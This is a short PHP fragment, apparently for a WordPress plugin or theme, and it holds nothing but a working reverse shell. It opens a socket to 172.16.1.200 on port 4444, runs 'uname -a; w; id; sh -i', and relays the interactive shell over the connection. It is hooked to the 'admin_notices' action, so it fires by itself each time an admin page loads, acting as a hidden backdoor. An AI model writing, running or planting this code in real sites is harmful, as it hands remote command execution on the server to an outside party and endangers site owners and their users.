function reverse_shell() {
    set_time_limit (0);
    $ip = '172.16.1.200';
    $port = 4444;
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; sh -i';
    $daemon = 0;
    $debug = 0;
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) { return; }
    $descriptorspec = array(
       0 => array("pipe", "r"),
       1 => array("pipe", "w"),
       2 => array("pipe", "w")
    );
    $process = proc_open($shell, $descriptorspec, $pipes);
    if (!is_resource($process)) { return; }
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);
    while (1) {
        if (feof($sock) || feof($pipes[1])) { break; }
        $read_a = array($sock, $pipes[1], $pipes[2]);
        stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) { fwrite($pipes[0], fread($sock, $chunk_size)); }
        if (in_array($pipes[1], $read_a)) { fwrite($sock, fread($pipes[1], $chunk_size)); }
        if (in_array($pipes[2], $read_a)) { fwrite($sock, fread($pipes[2], $chunk_size)); }
    }
    fclose($sock);
    proc_close($process);
}
add_action('admin_notices', 'reverse_shell');
